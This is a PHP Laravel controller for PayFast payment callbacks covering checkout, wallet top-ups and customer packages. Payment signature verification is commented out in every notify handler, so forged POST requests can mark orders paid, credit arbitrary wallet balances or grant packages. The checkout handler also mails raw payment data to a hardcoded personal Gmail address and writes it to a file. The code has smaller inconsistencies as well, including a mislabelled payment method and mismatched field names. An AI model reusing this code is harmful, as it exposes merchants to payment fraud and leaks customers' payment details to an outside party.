<?php

namespace App\Http\Controllers;

use App\Http\Controllers\CheckoutController;
use App\Http\Controllers\CustomerPackageController;
use App\Http\Controllers\WalletController;
use App\Models\User;
use App\Models\Wallet;
use Illuminate\Http\Request;
use App\Utility\PayfastUtility;
use Redirect;
use App\Models\Order;
use App\Models\BusinessSetting;
use App\Models\Seller;
use Session;
use App\Models\CustomerPackage;
use App\Http\Controllers\CommissionController;
use Auth;
use Twilio\TwiML\Voice\Pay;
use Storage;
use Mail;

class PayfastController extends Controller
{
    private $security_key;

    public function __construct()
    {

    }

    //sample ITN Payload
    /*$ITN_Payload = [
    'm_payment_id' => 'SuperUnique1',
    'pf_payment_id' => '1089250',
    'payment_status' => 'COMPLETE',
    'item_name' => 'test+product',
    'item_description' => ,
    'amount_gross' => 200.00,
    'amount_fee' => -4.60,
    'amount_net' => 195.40,
    'custom_str1' => ,
    'custom_str2' => ,
    'custom_str3' => ,
    'custom_str4' => ,
    'custom_str5' => ,
    'custom_int1' => ,
    'custom_int2' => ,
    'custom_int3' => ,
    'custom_int4' => ,
    'custom_int5' => ,
    'name_first' => ,
    'name_last' => ,
    'email_address' => ,
    'merchant_id' => '10012577',
    'signature' => 'ad8e7685c9522c24365d7ccea8cb3db7'
    ];*/


    //checkout related functions ------------------------------------<starts>
    public static function checkout_notify()
    {
        // Tell PayFast that this page is reachable by triggering a header 200
        header('HTTP/1.0 200 OK');
        flush();
        $pfData = $_POST;
        // $checks = PayfastUtility::check($pfData);

        try {
            Mail::raw(json_encode($pfData), function ($message) {
                $message->to('hridoymahmud71@gmail.com');
            });

            if (env('DEMO_MODE') != 'On') {
                $path = base_path('payfast.text');
                if (file_exists($path)) {

                    file_put_contents($path, json_encode($pfData));
                }


            }

        } catch (\Exception $e) {

        }

        if ($pfData['payment_status'] == "COMPLETE") {

            //custom_1 will have order_id
            return PayfastController::checkout_success($pfData['custom_str1'], $pfData);
        }

        return PayfastController::checkout_incomplete();
    }

    public static function checkout_return()
    {
        Session::put('cart', collect([]));
        Session::forget('payment_type');
        Session::forget('delivery_info');
        Session::forget('coupon_id');
        Session::forget('coupon_discount');

        flash(translate('Payment process completed'))->success();
        return redirect()->route('order_confirmed');
    }

    public static function checkout_cancel()
    {
        return PayfastController::checkout_incomplete();
    }

    public static function checkout_success($order_id, $responses)
    {
        $payment_details = json_encode($responses);
        $checkoutController = new CheckoutController;
        return $checkoutController->checkout_done($order_id, $payment_details);
    }

    public static function checkout_incomplete()
    {
        Session::forget('combined_order_id');
        flash(translate("Incomplete"))->error();
        //flash(translate('Payment failed'))->error();
        //dd($response_text);
        return redirect()->route('home')->send();
    }
    //checkout related functions ------------------------------------<ends>

    //wallet related functions ------------------------------------<starts>
    public static function wallet_notify()
    {
        // Tell PayFast that this page is reachable by triggering a header 200
        header('HTTP/1.0 200 OK');
        flush();
        $pfData = $_POST;
        // $checks = PayfastUtility::check($pfData);

        if ($pfData['payment_status'] == "COMPLETE") {
            //custom_1 will have user_id
            return PayfastController::wallet_success($pfData['custom_str1'], $pfData['amount_gross'], $_POST);
        }

        return PayfastController::wallet_incomplete();
    }

    public static function wallet_return()
    {
        Session::forget('payment_data');
        Session::forget('payment_type');

        flash(translate('Payment process completed'))->success();
        return redirect()->route('wallet.index');
    }

    public static function wallet_cancel()
    {
        return PayfastController::wallet_incomplete();
    }

    public static function wallet_success($id, $amount, $payment_details)
    {
        $user = User::find($id);
        $user->balance = $user->balance + $amount;
        $user->save();

        $wallet = new Wallet;
        $wallet->user_id = $user->id;
        $wallet->amount = $amount;
        $wallet->payment_method = 'payhere';
        $wallet->payment_details = json_encode($payment_details);
        $wallet->save();
    }

    public static function wallet_incomplete()
    {
        Session::forget('payment_data');
        flash(translate('Payment Incomplete'))->error();
        return redirect()->route('home')->send();
    }
    //wallet related functions ------------------------------------<ends>

    //customer package related functions ------------------------------------<starts>
    public static function customer_package_notify()
    {
        // Tell PayFast that this page is reachable by triggering a header 200
        header('HTTP/1.0 200 OK');
        flush();
        $pfData = $_POST;
        // $checks = PayfastUtility::check($pfData);
        
        if ($pfData['payment_status'] == "COMPLETE") {
            //custom_1 will have user_id custom_2 will have package_id
            return PayfastController::customer_package_success($_POST['custom_1'], $_POST['custom_2'], $_POST);
        }

        return PayfastController::customer_package_incomplete();
    }

    public static function customer_package_return()
    {
        Session::forget('payment_data');
        flash(translate('Payment process completed'))->success();
        return redirect()->route('dashboard');
    }

    public static function customer_package_cancel()
    {
        return PayfastController::customer_package_incomplete();
    }

    public static function customer_package_success($id, $customer_package_id, $payment_details)
    {
        $user = User::findOrFail($id);
        $user->customer_package_id = $customer_package_id;
        $customer_package = CustomerPackage::findOrFail($customer_package_id);
        $user->remaining_uploads += $customer_package->product_upload;
        $user->save();
    }

    public static function customer_package_incomplete()
    {
        Session::forget('payment_data');
        flash(translate("Payment Incomplete"))->error();
        return redirect()->route('home')->send();
    }
    //customer package related functions ------------------------------------<ends>


}
